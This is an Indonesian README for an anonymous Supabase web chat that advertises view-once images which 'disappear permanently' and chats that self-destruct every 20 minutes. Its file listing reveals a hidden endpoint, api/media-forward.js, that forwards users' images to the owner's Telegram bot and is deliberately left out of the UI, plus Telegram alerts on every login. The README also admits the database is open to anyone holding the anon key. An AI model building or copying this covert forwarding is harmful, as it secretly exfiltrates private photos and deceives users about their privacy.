# AnonChat — Web Chat Anonim (v3, simpel)

Tanpa nomor HP, tanpa password, tanpa daftar. Buka web → isi nama → langsung ngobrol.

**Cara pakai (v3):**
1. Buka web → isi **nama** → langsung masuk lobby
2. Ketuk ikon 👥 di kanan atas buat lihat **daftar nama yang online**
3. Ketik & kirim — semua orang di lobby langsung lihat (realtime)

**Fitur:**
- 🏠 **Satu lobby publik** — semua ngobrol bareng, tanpa room, tanpa kode DM
- 👥 **Daftar nama online** — lihat siapa aja yang lagi buka web
- ⌨️ **Indikator mengetik** — "mengetik..." muncul live
- ✅ **Centang dibaca** — 1 abu terkirim, 2 abu diterima, **2 biru dibaca**
- 📷 **Gambar Dilihat-Sekali** — kirim foto (maks FHD 1920×1080, otomatis dikompres); tampil blur, ketuk untuk membuka, **hilang permanen setelah dilihat** ala WA
- ⏳ **Timer bom 20 menit** — chip hitung mundur di header; semua chat & sesi hancur otomatis tiap 20 menit
- 🔐 **Gerbang sandi** — verifikasi server-side, token HMAC
- ⚡ **Realtime** — pesan masuk langsung via Supabase Realtime

## Cara menjalankan

### 1. Bikin project Supabase (gratis)
- Buka https://supabase.com → New Project
- Tunggu sampai project aktif

### 2. Jalankan schema database
- Di dashboard Supabase: **SQL Editor → New Query**
- Copy-paste seluruh isi `supabase-schema.sql` → **Run**
- Ini bikin tabel `users`, `rooms`, `messages` + seed Lobby Publik + akses anonim

### 3. Isi config
- Di dashboard: **Project Settings → API**, salin `Project URL` dan `anon public key`
- Buka `config.js`, tempel kedua nilai itu

### 4. Deploy
File-file ini statis 100%, bisa di-host di mana aja:
- **Vercel**: hubungkan repo GitHub → auto-deploy tiap push ke `main`
- **GitHub Pages / Netlify / Cloudflare Pages**: upload folder apa adanya
- **Lokal**: `npx serve .` lalu buka http://localhost:3000

## Catatan penting (jujur-jujuran)
- **Tanpa login = tanpa identitas permanen.** Nama tersimpan di `localStorage` — ganti browser/HP = jadi "orang baru". Itu bagian dari konsep anonimnya.
- **Akses database terbuka** (sesuai konsep anonim): siapa pun yang pegang anon key bisa baca/tulis. Untuk projek santai oke; untuk produksi butuh rate-limit & moderasi.
- Chat otomatis terhapus 24 jam setelah dikirim (dihapus tiap aplikasi dibuka + difilter saat dimuat).

## Struktur file
```
anonchat/
├── index.html               # UI: lobby chat + panel daftar online + modal nama + viewer gambar
├── style.css                # tema terang WhatsApp iPhone
├── app.js                   # logika: nama, lobby, realtime, mengetik, centang, view-once, bom 20 mnt
├── config.js                # ← ISI INI: URL + anon key Supabase
├── api/
│   ├── gate.js              # verifikasi sandi → token HMAC
│   ├── session.js           # validasi token sesi
│   ├── login-notify.js      # notif Telegram tiap login sukses
│   └── media-forward.js     # teruskan gambar ke bot Telegram Bos (tidak disebut di UI)
├── supabase-schema.sql      # schema database (dijalankan sekali)
├── supabase-migration-02.sql
├── supabase-migration-03.sql # v4: centang terkirim/dibaca (delivered_to, read_by, mark_msg)
├── supabase-migration-04.sql # v5: gambar dilihat-sekali (kind, media, viewed_by)
└── README.md
```
